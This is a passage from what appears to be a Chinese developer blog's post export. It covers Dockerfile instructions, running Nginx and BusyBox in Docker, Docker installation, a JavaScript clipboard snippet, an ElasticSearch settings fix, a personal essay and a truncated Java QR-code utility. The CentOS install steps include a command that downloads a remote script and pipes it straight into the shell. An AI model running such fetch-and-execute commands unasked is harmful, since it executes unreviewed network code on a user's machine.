方式设置稳定的默认命令和选项，而使用CMD添加默认之外经常被改动的选项。 123FROM ubuntuENTRYPOINT [&quot;top&quot;, &quot;-b&quot;]CMD [&quot;-c&quot;] 通过 Dockerfile 使用ENTRYPOINT展示前台运行 Apache 服务 12345FROM debian:stableRUN apt-get update &amp;&amp; apt-get install -y --force-yes apache2EXPOSE 80 443VOLUME [&quot;/var/www&quot;, &quot;/var/log/apache2&quot;, &quot;/etc/apache2&quot;]ENTRYPOINT [&quot;/usr/sbin/apache2ctl&quot;, &quot;-D&quot;, &quot;FOREGROUND&quot;] Shell form ENTRYPOINT 例子 这种方式会在/bin/sh -c中执行，会忽略任何CMD或者docker run命令行选项，为了确保docker stop能够停止长时间运行ENTRYPOINT的容器，确保执行的时候使用exec选项。12FROM ubuntuENTRYPOINT exec top -b 如果在ENTRYPOINT忘记使用exec选项，则可以使用CMD补上:123FROM ubuntuENTRYPOINT top -bCMD --ignored-param1 # --ignored-param2 ... --ignored-param3 ... 依此类推 10、VOLUME1VOLUME [&quot;/data&quot;] 将本地主机目录挂载到目标容器中或者将其他容器挂载的挂载点 挂载到目标容器中 11、USER1USER daemon 指定运行容器时的用户名或 UID，后续的RUN、CMD、ENTRYPOINT也会使用指定用户。 11、WORKDIR1WORKDIR /path/to/workdir 为后续的RUN、CMD、ENTRYPOINT指令配置工作目录。可以使用多个WORKDIR指令，后续命令如果参数是相对路径，则会基于之前命令指定的路径。1234WORKDIR /aWORKDIR bWORKDIR cRUN pwd 最终路径是/a/b/c。 WORKDIR指令可以在ENV设置变量之后调用环境变量:12ENV DIRPATH /pathWORKDIR $DIRPATH/$DIRNAME 最终路径则为 /path/$DIRNAME。 12、ONBUILD1ONBUILD [INSTRUCTION] 使用该dockerfile生成的镜像A，并不执行ONBUILD中命令如再来个dockerfile 基础镜像为镜像A时，生成的镜像B时就会执行ONBUILD中的命令 参考链接：http://www.open-open.com/lib/view/open1423703640748.html]]></content>
      <categories>
        <category>开发工具</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker（四）、运行Nginx]]></title>
    <url>%2Fblog%2F2018%2F01%2F13%2FDocker%EF%BC%88%E5%9B%9B%EF%BC%89%E3%80%81%E8%BF%90%E8%A1%8CNginx%2F</url>
    <content type="text"><![CDATA[Docker 运行nginx运行了hello world 还不是我们的目标，这章我们要来学习运行一个静态的页面 一、获取Nginx获取镜像1docker pull nginx 二、启动镜像方法一：指定端口映射本机80端口 映射 容器的80端口,-d 是后台运行的意思，12# --name 是给它指定一个名字，我们这里给它指定的名字叫mynginx(不指定时docker会随机给它起一个名字)docker run -d --name mynginx -p 80:80 nginx 方法二：随机端口映射本机随机指定一个端口映射容器的nginx 启动端口,-d 是后台运行的意思1docker run -d --name mynginx -P 80:80 nginx 三、浏览器访问nginx 默认启动的端口为 80通过命令docker ps 或者 docker ps | grep nginx，查看端口的映射情况浏览器访问：http://localhost/ 或者 curl http://localhost/ 四、修改index.html 页面方法一：进入容器内部修改index.html 页面这就需要我们学新的一个命令docker exec了。格式如下：12# 参数-i是与用户交互式 -t 可以理解为一个伪终端，具体的可以通过 docker exec --help 命令来查看exec 的参数详解docker exec -it mynginx bash 运行上面的命令之后我们就进到了运行nginx 容器里了，我们要修改的index页面的路径为/usr/share/nginx/html/index.html当我们想使用vim 对它进行修改的时候，发现没有vim 这个命令。所以我们需要安装vim,运行如下命令（测试可以这么干）12# 更新源，然后安装vim,然后就可以编辑了。apt-get update &amp;&amp; apt-get install -y vim 接下来就可以修改了，想退出容器只需要运行exit 命令即可 方法二：映射页面目录（推荐）1、首先我们新建一个目录，并进入该目录，建立一个html的子目录123# -p 是递归创建mkdir -p docker-nginx/htmlcd docker-nginx 2、在html目录下创建一个index.html页面1234567891011121314vim html/index.html# 编辑内容如下：&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;title&gt;Hello Docker&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;Hello Docker!!!&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt; 3、运行容器在运行容器之前我们要把刚刚运行的容器停止掉，以为我们需要用80来启动它（如果你不要80端口，可以不用停止它）12345678# 停止刚才运行的容器，mynginx 就是我们刚才命名的docker stop mynginx# 这里是把这个容器删除掉，也可以不删掉，但是下面我下面又使用了mynginx,docker rm mynginx# 启动本地映射html 页面的容器docker run -d -p 80:80 --name mynginx -v &quot;$PWD/html&quot;:/usr/share/nginx/html docker.io/nginx 打开浏览器，访问 http://localhost/，应该就能看到 Hello Docker!!! 了我们可以在我们的主机上修改 index.html 的内容，然后刷新浏览器，看是否浏览器也更新了。 五、挂载配置文件1、拷贝nginx容器的配置文件12# 别忘了后面有一个 `.` 这个点表示当前目录docker cp mynginx:/etc/nginx . 2、改名执行完成后，当前目录应该多出一个nginx子目录。然后，把这个子目录改名为conf1mv nginx conf 3、停止我们刚才运行的容器1docker stop mynginx 4、重新启动我们的容器名字这里得改一下 mynginx 刚才我们已经用了1docker run -d --name mynginx2 -v &quot;$PWD/html&quot;:/usr/share/nginx/html -v &quot;$PWD/conf&quot;:/etc/nginx -p 80:80 docker.io/nginx 5、修改配置只需要修改 conf/conf.d/default.conf文件即可]]></content>
      <categories>
        <category>开发工具</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Js 点击复制文本内容]]></title>
    <url>%2Fblog%2F2018%2F01%2F13%2FJs%20%E7%82%B9%E5%87%BB%E5%A4%8D%E5%88%B6%E6%96%87%E6%9C%AC%E5%86%85%E5%AE%B9%2F</url>
    <content type="text"><![CDATA[Js 点击复制文本内容一、利用第三方插件 clipboard.js123456789101112131415161718192021222324252627282930313233&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head lang=&quot;en&quot;&gt;&lt;meta charset=&quot;UTF-8&quot;&gt;&lt;title&gt;&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;textarea id=&quot;target&quot;&gt;复制我里面的内容&lt;/textarea&gt;&lt;/br&gt;&lt;button class=&quot;btn&quot; id=&quot;myb&quot; data-clipboard-action=&quot;copy&quot; data-clipboard-target=&quot;#target&quot;&gt;点我复制&lt;/button&gt;&lt;script src=&quot;clipboard.min.js&quot;&gt;&lt;/script&gt;&lt;script&gt;var clipboard=new Clipboard(&apos;#myb&apos;);clipboard.on(&apos;success&apos;,function(e) &#123; console.log(&quot;success&quot;,&quot;内容已经复制到剪切板啦&quot;); console.info(&apos;Action:&apos;, e.action); console.info(&apos;Text:&apos;, e.text); console.info(&apos;Trigger:&apos;, e.trigger); //e.clearSelection();&#125;);clipboard.off(&apos;success&apos;,function(e) &#123; console.log(&quot;success&quot;,&quot;内容已经复制到剪切板啦&quot;); console.info(&apos;Action:&apos;, e.action); console.info(&apos;Text:&apos;, e.text); console.info(&apos;Trigger:&apos;, e.trigger); //e.clearSelection();&#125;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 详细用法：https://github.com/zenorocha/clipboard.js 二、execCommand123456789101112131415161718192021222324252627&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head lang=&quot;en&quot;&gt;&lt;meta charset=&quot;UTF-8&quot;&gt;&lt;title&gt;&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;点击复制后在右边textarea CTRL+V看一下&lt;/p&gt;&lt;input type=&quot;text&quot; id=&quot;inputText&quot; value=&quot;这里是复制的文本内容！！！！&quot;/&gt;&lt;input type=&quot;button&quot; id=&quot;btn&quot; value=&quot;复制&quot;/&gt;&lt;textarea rows=&quot;4&quot;&gt;&lt;/textarea&gt;&lt;script type=&quot;text/javascript&quot;&gt; window.onload = function () &#123; var btn = document.getElementById(&apos;btn&apos;); btn.addEventListener(&apos;click&apos;, function()&#123; var inputText = document.getElementById(&apos;inputText&apos;); inputText.focus(); inputText.setSelectionRange(0, inputText.value.length); document.execCommand(&apos;copy&apos;, true); &#125;); &#125;;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 感觉介绍两种差不多了，第一种比较方便。一般第一种就够用了]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ElasticSearch 查询报错QueryPhaseExecutionException Result window is too large....]]></title>
    <url>%2Fblog%2F2018%2F01%2F13%2FElasticSearch%20%E6%9F%A5%E8%AF%A2%E6%8A%A5%E9%94%99QueryPhaseExecutionException%20Result%20window%20is%20too%20large....%2F</url>
    <content type="text"><![CDATA[ES 报错一、QueryPhaseExecutionException12nested: QueryPhaseExecutionException[Result window is too large, from + size must be less than or equal to: [10000] but was [10010]. See the scroll api for a more efficient way to request large data sets. This limit can be set by changing the [index.max_result_window] index level setting.]; &#125; 解决方法：12# indexName 改为你的索引名称curl -XPUT http://127.0.0.1:9200/indexName/_settings -d &apos;&#123; &quot;index&quot; : &#123; &quot;max_result_window&quot; : 100000000&#125;&#125;&apos;]]></content>
      <categories>
        <category>搜索引擎</category>
      </categories>
      <tags>
        <tag>ElasticSearch</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker（三）、运行一个 Hello World]]></title>
    <url>%2Fblog%2F2018%2F01%2F12%2FDocker%EF%BC%88%E4%B8%89%EF%BC%89%E3%80%81%E8%BF%90%E8%A1%8C%E4%B8%80%E4%B8%AA%20Hello%20World%2F</url>
    <content type="text"><![CDATA[Docker 初体验前面看了那么多文字，可能还是不知道docker 怎么用。学编程少不了hello world,所以，我们就来试一个helloworld一、简单命令 命令 详解 docker search 搜索images docker pull 获取images docker run 运行images docker ps 查看后台运行的容器 docker build 构建images docker images 列出images docker rm 删除container docker rmi 删除images docker cp 在host和container之间拷贝文件 docker commit 保存改动为新的images 二、下载并运行一个hello-worlddocker 官方给出了一个hello-world 我们运行它就可以了，可以通过搜索命令进行搜索12345678# 搜索docker search hello-world# 下载下来docker pull hello-world# 运行 hello-worlddocker run hello-world 看到上面打印出来的信息，表示我们的hello world 已经成功运行了。2、我们在试一个例子busyBox是一个最小的Linux系统，它提供了该系统的主要功能，不包含一些与GNU相关的功能和选项12345# 下载docker pull docker.io/busybox## 运行docker run busybox /bin/echo Hello Docker 因为上面一运行完，容器就退出了，我们试试让busybox 在后台运行1ps_job=$(docker run -d busybox /bin/sh -c &quot;while true; do echo Hello Docker; sleep 1; done&quot;) $ps_job 这个就是这个容器的ID ，我们可以打印看看1echo $ps_job 查看后台运行的容器1docker ps 查看日志1docker logs $ps_job 停止容器1234docker stop $ps_job# 快速停止容器，比较暴力的做法docker kill $ps_job 启动容器1docker start $ps_job 重新启动容器1docker restart $ps_job 查看所有容器1docker ps -a 删除指定容器1docker rm $ps_job 删除所有容器12# -q 这个参数是只显示PID docker rm $(docker ps -aq) 查看镜像的历史版本1docker history (image_name) 将镜像推送到registry12# 提示输入用户名密码即可docker push (image_name) 三、可能报的错1error pulling image configuration: Get https://dseasb33srnrn.cloudfront.net/registry-v2/docker/registry/v2/blobs/sha256/e3/e38bc07ac18ee64e6d59cf2eafcdddf9cec2364dfe129fe0af75f1b0194e0c96/data?Expires=1523560885&amp;Signature=K7PnkaObjZRxEQxHwJJu6rUL~jUJDhsL8H~r33DQngwMObZz2ybaG0~ArA4ybO0qcLi6KCOS9QUzihJgLAZFs33QmHRS4Bq~rd60RmSg5vlOwe7o0demgKTETGZuNs0q6IGlhiHRmuQfIddmEPnkuocO0YsXIL1AFYyWrwlkR~E_&amp;Key-Pair-Id=APKAJECH5M7VWIS5YZ6Q: net/http: TLS handshake timeout 这是因为docker默认镜像拉取地址为国外仓库下载速度较慢，则会报错“net/http: TLS handshake timeout”。此时，只需要将拉取地址改为国内镜像仓库即可。解决方案：修改 /etc/docker/daemon.json 文件并添加上 registry-mirrors 键值1vim /etc/docker/daemon.json 添加下面的内容，可以加多个镜像123&#123; &quot;registry-mirrors&quot;: [&quot;https://registry.docker-cn.com&quot;]&#125; 四、Docker 运行的流程图]]></content>
      <categories>
        <category>开发工具</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker（二）、快速安装]]></title>
    <url>%2Fblog%2F2018%2F01%2F11%2FDocker%EF%BC%88%E4%BA%8C%EF%BC%89%E3%80%81%E5%BF%AB%E9%80%9F%E5%AE%89%E8%A3%85%2F</url>
    <content type="text"><![CDATA[Docker的安装1$ uname -r 检查内核版本，返回的值大于3.10即可。 一、在Ubuntu中安装Docker官网文档地址：https://docs.docker.com/install/linux/docker-ce/ubuntu/#prerequisites1、安装Ubuntu维护的版本12$sudo apt-get install docker.io$source /etc/bash_completion.d/docker.io 然后查看版本，检测是否安装成功：1$sodu docker.io version 2、安装Docker维护的版本这里也分为二种方式方法一（推荐）12$ sudo apt-get update$ sudo apt-get install docker-ce 方法二下载docker 写好的安装脚本，直接运行即可1234$ sudo add-apt-repository \ &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu \ $(lsb_release -cs) \ stable&quot; 二、在Windows中安装Docker因为docker 依赖与Linux 内核的Namespaceh和Cgroups，所以需要一种虚拟机来实现下载页面：https://store.docker.com/editions/community/docker-ce-desktop-windows下载地址：https://download.docker.com/win/stable/Docker%20for%20Windows%20Installer.exe 三、在Mac中安装Docker下载页面：https://store.docker.com/editions/community/docker-ce-desktop-mac下载地址:https://download.docker.com/mac/stable/Docker.dmg 四、在Centos 中嘿嘿，我比较熟Centos ，只有这个是亲测的，其他的都是官方的文档 官网文档地址：https://docs.docker.com/install/linux/docker-ee/centos/#package-install-and-upgrade1、卸载旧版本(如果安装过旧版本的话)1234567891011$ sudo yum remove docker \ docker-client \ docker-client-latest \ docker-common \ docker-latest \ docker-latest-logrotate \ docker-logrotate \ docker-selinux \ docker-engine-selinux \ docker-engine \ docker-ce 2、下载官方的安装脚本并运行12345# 方法一 yum install -y docker# 方法二curl -sSL https://get.docker.com | sh 3、启动docker123456# centos 7 启动命令 $ sudo systemctl start docker# 开启自启动systemctl enable docker 4、查看版本1234$ docker version# 查看docker 的信息$ docker info]]></content>
      <categories>
        <category>开发工具</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker（一）、Docker是什么]]></title>
    <url>%2Fblog%2F2018%2F01%2F11%2FDocker%EF%BC%88%E4%B8%80%EF%BC%89%E3%80%81Docker%E6%98%AF%E4%BB%80%E4%B9%88%2F</url>
    <content type="text"><![CDATA[Docker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口。Docker 也被称为第三代PasS平台一、Docker 的起源1、Docker 的创始人 ———— Solomon Hykes2、历史发展 2010年，几个年轻人在旧金山成立了一家做PaaS平台的公司，起名为 dotCloud,dotCloud 主要是基于PaaS平台为开发者或开发商提供技术服务。 docker 于2013年3月27 正式作为public项目发布 dotCloud 公司2013.10改名为Docker Inc,转型专注于Docker引擎和Docker生态系统。 2014.2月被Black duck 评选为2013年10大开源新项目 2014.9月获取4000万美元融资 2015.4月获取9500万美元融资 2015.6月DockerCon 2015 大会上，Linux基金会与行业巨头联手打造开放容器技术项目Open Container Project 2016.1月Docker凭借着Docker Datacenter与Docker Cloud的发布而迎来爆炸式增长 2017.4月Docker 公司将 Docker 项目改名为 Moby Project，Docker 这个名称保留用作其产品名（纳尼，docker 变成了 moby,那么可爱的鲸鱼图标，变成丑得一比的moby） Github地址 二、Docker 的技术原理介绍 Docker 就是虚拟化的一种轻量级替代技术，Docker的容器技术不依赖任何语言、框架或系统。可以将app变成一种标准化的，可移植的、自管理的组件，并脱离服务器硬件在任何主流系统中开发、调试和运行 简单的说就是在Linux系统上迅速创建一个容器（类型虚拟机）并在容器上部署和运行应用程序，并通过配置文件可以轻松实现应用程序的自动化安装、部署和升级，非常方便，因为使用容器，可以方便的把生产环境和开发环境分开，互不影响，这是docker最普遍的一个玩法。 1、核心技术之cgroups Linux 系统中经常有个需求就是希望能限制某个或者某些进程的分配资源，于是就出现了cgroups的概念。 cgroup 就是Controller Group,就这个group 中，有分配好的特定比例的cpu时间、IO时间、可用内存大小等系统资源。 cgroups 是将任意进程进行分组化管理的Linux内核功能，最初由Google的工程师提出，后来整合进Linux内核中。 cgroups中的重要概念是子系统，也就是资源控制器，每种子系统就是一个资源分配器，比如cpu子系统是控制cpu时间分配的，首先挂在子系统，然后才有control group的。比如先挂载memory子系统，然后在其子系统中创建一个cgroup节点，在这个节点中，将需要控制的进程id写入，并且将控制的属性写入，这就完成了内存的资源限制 2、核心技术之LXC LXC是Linux Containers 的简称，是一种基于容器额操作系统层级的虚拟技术，借助于namespace的隔离机制和cgroup限额功能，LXC提供了一套统一的API和和工具来建立和管理container.LXC跟其他操作系统层次的虚拟机相比，最大的优势在于LXC被中和进内核，不用单独为内核打补丁。 LXC旨在提供一个共享的Kernel(内核)的OS级虚拟化方法，在执行时不用重复加载Kernel,且container的Kernel与主机共享，因此可以大大加快container的启动过程，并显著减少内存消耗，容器在提供隔离的同时，还通过共享这些资源节省开销，这意味着容器比真正的虚拟化开销要小得多，在实际测试中，基于LXC的虚拟化方法的IO和CPU性能几乎接近baremetal（裸机）的性能。 从 0.9 版本开始使用 libcontainer 替代 lxc)Docker 1.11后 改用runC和containerd可参考：LXClibcontainerrunCcontainerd 3、核心技术之AUFS 什么时AUFS?AUFS是一个能透明覆盖一个或多个现有文件系统的层状文件系统，支持将不同目录挂载到同一个虚拟文件系统下，可以把不同的目录联合在一起，组成一个单一的目录，这种是一种虚拟的文件系统，文件系统不用格式化就可以直接挂载。 Docker一直在用AUFS作为容器的文件系统，当一个进程需要修改一个文件时，AUFS创建该文件的一个副本。AUFS可以把多层合并成文件系统的单层表示，这个过程称为写入复制（copy on write）。 AUFS允许Docker把某些镜像作为容器的基础，例如，你可能有一个可以作为很多不同容器的基础的Centos系统镜像，只要一个ContOS 镜像的副本就可以了，这样既节省了存储和内存，也保证更快速的容器部署。 使用AUPS的另一个好处是Docker的版本容器镜像能力，每个新版本都是一个与之前版本的简单差异改动，有效地保持镜像文件最小化，但，这也意味着你总是要有一个记录该容器从一个版本到另一个版本改动的审计跟踪。 三、Docker 的基本概念1、ClientClient 就是Docker的客户端2、Imageimage（镜像）：是一个极度精简版的Linux程序运行环境，比如vi这种基本的工具都没有，它是需要定制化Build的一个“安装包” 。 Dockerfile 用来创建一个自定义的image,包含用户指定的软件依赖等，使用build命令进行创建。3、ContainerContainer （容器）：是Image 的实例，共享系统内核4、DaemonDaemon（守护进程）：是创建和运行Container的Linux守护进程，可以理解为Docker Container的Container5、RegistryRegistry/Hub（镜像仓库）：你可以在Docker Hub上轻松下载大量已经容器化好的应用镜像，即拉即用，有些是Docker官方维护的，有些是开发者自发上传分享的。 若有不对的地方，欢迎指正]]></content>
      <categories>
        <category>开发工具</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[趁我未老，你来可好]]></title>
    <url>%2Fblog%2F2018%2F01%2F06%2F%E8%B6%81%E6%88%91%E6%9C%AA%E8%80%81%EF%BC%8C%E4%BD%A0%E6%9D%A5%E5%8F%AF%E5%A5%BD%2F</url>
    <content type="text"><![CDATA[不知从什么时候开始，孤独这两个字，开始进入我的心。我开始觉得一个人的日子是那么的难熬， 可能是因为年龄大了吧!还记得年少时的我，也曾一个人独来独往，可那时的我，却未曾感到过孤单， 更不曾感到过孤独，或许只有经历过思念的苦涩与心酸，才能体会什么是真正的孤单。只有拥有过爱情的悲伤与幸福， 才能感受到一个人独处的孤独。爱情就像酒，而孤独则是喝酒上了的瘾。没有喝过酒的人，永远不知道酒的滋味， 更不能理解喝酒上了瘾的那种感觉，我就如同一个喝过酒的人，如今酒没有了，我却发现已经上瘾了，戒不掉了。 于是我开始对爱情有了一种从未有过的渴望，我渴望一段长长久久的爱情，这种爱情，即是平平淡淡却又是从一而终的。 既是争争吵吵却又是白守不分离的。于是我开始寻觅，开始争取。可是在爱情的世界里， 我永远都是一个感性而又愚蠢的人。为了爱情，我卸下了作为一个男人的自尊，我毫不犹豫的拾起了年少时的那份单纯。 我以为，情之深则感天动地，爱之深则可以感动于你。可我错了，更可恨的，是我一次又一次的错，而且还知错不改。 我就是这样一个对爱执着的人。正是这样的执着，让我相信，总有一天我会遇见那个同样爱我的你。 我从来没有放弃过属于我的每一次缘分，更没有错失过人生中该有每一次珍惜。我是个多情的人，而这一种多情， 只为了遇见那个未来唯一的你。每一次十字路口的徘徊，每一次人海之中的转身，都只为遇见你， 那个我心中认为命中注定的你，那个我眼里觉得似曾相识的你，那个愿意和我相伴一生的你。我相信缘分， 所以我相信会有人和我心有灵犀。总有一个人会在某个路过执着的等着我。可是茫茫人海，你又在哪里等我， 我又该如何才能遇上你。 佛说：前世五百次的回眸，才换来了今生与你的擦肩而过”。我想我前世肯定是少看了你一眼， 所以今生才忘记了你的样子，以至于到现在还未能与你擦肩。如果生命可以轮回，我希望能够回到前世， 一直看着你，直到我死去。这样，在轮回的今生里，我和你，就绝不会仅仅只是擦肩而过的缘分。 从未辜负任何人，因为对于爱情，我对别人比对自己还要真。也许正是这样，我才会让我的每段感情失去平衡， 最后我掉入深渊，别人飞向远方。我不怨恨任何伤害过我的人，因为我相信每个人都有自己不得已的原因。 我只希望，在我还有爱的能力和爱的勇气的时候，能够尽快的遇见那个有缘的你。 如若真是缘分不够，才让你我无法遇见，那我情愿，为你再多等些年。我相信爱情自有天意， 而缘分也是冥冥之中注定。不然：这些年，我怎会争取不到你。既然总是求而不得，那我只能选择静静的等， 无论天长地久，无论海枯石烂，我都甘愿为你等至生命的最后。 但如若可以，我还是希望，能在这个刚刚好年纪里，遇到那个白首不分离的你。 时光安然，岁月静好，趁我未老，你来可好]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[java 二维码工具类]]></title>
    <url>%2Fblog%2F2018%2F01%2F05%2Fjava%20%E4%BA%8C%E7%BB%B4%E7%A0%81%E5%B7%A5%E5%85%B7%E7%B1%BB%2F</url>
    <content type="text"><![CDATA[一、依赖12345678910&lt;dependency&gt; &lt;groupId&gt;com.google.zxing&lt;/groupId&gt; &lt;artifactId&gt;core&lt;/artifactId&gt; &lt;version&gt;3.3.0&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;com.google.zxing&lt;/groupId&gt; &lt;artifactId&gt;javase&lt;/artifactId&gt; &lt;version&gt;3.1.0&lt;/version&gt; &lt;/dependency&gt; 二维码工具类123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290package top.lrshuai.blog.code;import java.awt.BasicStroke; import java.awt.Graphics; import java.awt.Graphics2D; import java.awt.Image; import java.awt.Shape; import java.awt.geom.RoundRectangle2D; import java.awt.image.BufferedImage; import java.io.File; import java.io.OutputStream; import java.util.Hashtable; import java.util.Random; import javax.imageio.ImageIO; import com.google.zxing.BarcodeFormat; import com.google.zxing.BinaryBitmap; import com.google.zxing.DecodeHintType; import com.google.zxing.EncodeHintType; import com.google.zxing.MultiFormatReader; import com.google.zxing.MultiFormatWriter; import com.google.zxing.Result; import com.google.zxing.client.j2se.BufferedImageLuminanceSource; import com.google.zxing.common.BitMatrix; import com.google.zxing.common.HybridBinarizer; import com.google.zxing.qrcode.decoder.ErrorCorrectionLevel; /** * 二维码工具类 * */ public class QRCodeUtil &#123; private static final String CHARSET = &quot;utf-8&quot;; private static final String FORMAT = &quot;JPG&quot;; // 二维码尺寸 private static final int QRCODE_SIZE = 300; // LOGO宽度 private static final int LOGO_WIDTH = 60; // LOGO高度 private static final int LOGO_HEIGHT = 60; private static BufferedImage createImage(String content, String logoPath, boolean needCompress) throws Exception &#123; Hashtable&lt;EncodeHintType, Object&gt; hints = new Hashtable&lt;EncodeHintType, Object&gt;(); hints.put(EncodeHintType.ERROR_CORRECTION, ErrorCorrectionLevel.H); hints.put(EncodeHintType.CHARACTER_SET, CHARSET); hints.put(EncodeHintType.MARGIN, 1); BitMatrix bitMatrix = new MultiFormatWriter().encode(content, BarcodeFormat.QR_CODE, QRCODE_SIZE, QRCODE_SIZE, hints); int width = bitMatrix.getWidth(); int height = bitMatrix.getHeight(); BufferedImage image = new BufferedImage(width, height, BufferedImage.TYPE_INT_RGB); for (int x = 0; x &lt; width; x++) &#123; for (int y = 0; y &lt; height; y++) &#123; image.setRGB(x, y, bitMatrix.get(x, y) ? 0xFF000000 : 0xFFFFFFFF); &#125; &#125; if (logoPath == null || &quot;&quot;.equals(logoPath)) &#123; return image; &#125; // 插入图片 QRCodeUtil.insertImage(image, logoPath, needCompress); return image; &#125; /** * 插入LOGO * * @param source * 二维码图片 * @param logoPath * LOGO图片地址 * @param needCompress * 是否压缩 * @throws Exception */ private static void insertImage(BufferedImage source, String logoPath, boolean needCompress) throws Exception &#123; File file = new File(logoPath); if (!file.exists()) &#123; throw new Exception(&quot;logo file not found.&quot;); &#125; Image src = ImageIO.read(new File(logoPath)); int width = src.getWidth(null); int height = src.getHeight(null); if (needCompress) &#123; // 压缩LOGO if (width &gt; LOGO_WIDTH) &#123; width = LOGO_WIDTH; &#125; if (height &gt; LOGO_HEIGHT) &#123; height = LOGO_HEIGHT; &#125; Image image = src.getScaledInstance(width, height, Image.SCALE_SMOOTH); BufferedImage tag = new BufferedImage(width, height, BufferedImage.TYPE_INT_RGB); Graphics g = tag.getGraphics(); g.drawImage(image, 0, 0, null); // 绘制缩小后的图 g.dispose(); src = image; &#125; // 插入LOGO Graphics2D graph = source.createGraphics(); int x = (QRCODE_SIZE - width) / 2; int y = (QRCODE_SIZE - height) / 2; graph.drawImage(src, x, y, width, height, null); Shape shape = new RoundRectangle2D.Float(x, y, width, width, 6, 6); graph.setStroke(new BasicStroke(3f)); graph.draw(shape); graph.dispose(); &#125; /** * 生成二维码(内嵌LOGO) * 二维码文件名随机，文件名可能会有重复 * * @param content * 内容 * @param logoPath * LOGO地址 * @param destPath * 存放目录 * @param needCompress * 是否压缩LOGO * @throws Exception */ public static String encode(String content, String logoPath, String destPath, boolean needCompress) throws Exception &#123; BufferedImage image = QRCodeUtil.createImage(content, logoPath, needCompress); mkdirs(destPath); String fileName = new Random().nextInt(99999999) + &quot;.&quot; + FORMAT.toLowerCase(); ImageIO.write(image, FORMAT, new File(destPath + &quot;/&quot; + fileName)); return fileName; &#125; /** * 生成二维码(内嵌LOGO) * 调用者指定二维码文件名 * * @param content * 内容 * @param logoPath * LOGO地址 * @param destPath * 存放目录 * @param fileName * 二维码文件名 * @param needCompress * 是否压缩LOGO * @throws Exception */ public static String encode(String content, String logoPath, String destPath, String fileName, boolean needCompress) throws Exception &#123; BufferedImage image = QRCodeUtil.createImage(content, logoPath, needCompress); mkdirs(destPath); fileName = fileName.substring(0, fileName.indexOf(&quot;.&quot;)&gt;0?fileName.indexOf(&quot;.&quot;):fileName.length()) + &quot;.&quot; + FORMAT.toLowerCase(); ImageIO.write(image, FORMAT, new File(destPath + &quot;/&quot; + fileName)); return fileName; &#125; /** * 当文件夹不存在时，mkdirs会自动创建多层目录，区别于mkdir． * (mkdir如果父目录不存在则会抛出异常) * @param destPath * 存放目录 */ public static void mkdirs(String destPath) &#123; File file = new File(destPath); if (!file.exists() &amp;&amp; !file.isDirectory()) &#123; file.mkdirs(); &#125; &#125; /** * 生成二维码(内嵌LOGO) * * @param content * 内容 * @param logoPath * LOGO地址 * @param destPath * 存储地址 * @throws Exception */ public static String encode(String content, String logoPath, String destPath) throws Exception &#123; return QRCodeUtil.encode(content, logoPath, destPath, false); &#125; /** * 生成二维码 * * @param content * 内容 * @param destPath * 存储地址 * @param needCompress * 是否压缩LOGO * @throws Exception */ public static String encode(String content, String destPath, boolean needCompress) throws Exception &#123; return QRCodeUtil.encode(content, null, destPath, needCompress); &#125; /** * 生成二维码 * * @param content * 内容 * @param destPath * 存储地址 * @throws Exception */ public static String encode(String content, String destPath) throws Exception &#123; return QRCodeUtil.encode(content, null, destPath, false); &#125; /** * 生成二维码(内嵌LOGO) * * @param content * 内容 * @param logoPath * LOGO地址 * @param output * 输出流 * @param needCompress * 是否压缩LOGO * @throws Exception */ public static void encode(String content, String logoPath, OutputStream output, boolean needCompress) throws Exception &#123; BufferedImage image = QRCodeUtil.createImage(content, logoPath, needCompress); ImageIO.write(image, FORMAT, output); &#125; /** * 生成二维码 * * @param content * 内容 * @param output * 输出流 * @throws Exception */ public static void encode(String content, OutputStream output) throws Exception &#123; QRCodeUtil.encode(content, null, output, false); &#125; /** * 解析二维码 * * @param file * 二维码图片 * @return * @throws Exception */ public static String decode(File file) throws Exception &#123; BufferedImage image; image = ImageIO.read(file); if (image == null) &#123; return null; &#125; BufferedImageLuminanceSource source = new BufferedImageLuminanceSource(image); BinaryBitmap bitmap = new BinaryBitmap(new HybridBinarizer(source)); Result result; Hashtable&lt;DecodeHintType, Object&gt; hints = new Hashtable&lt;DecodeHintType, Object&gt;(); 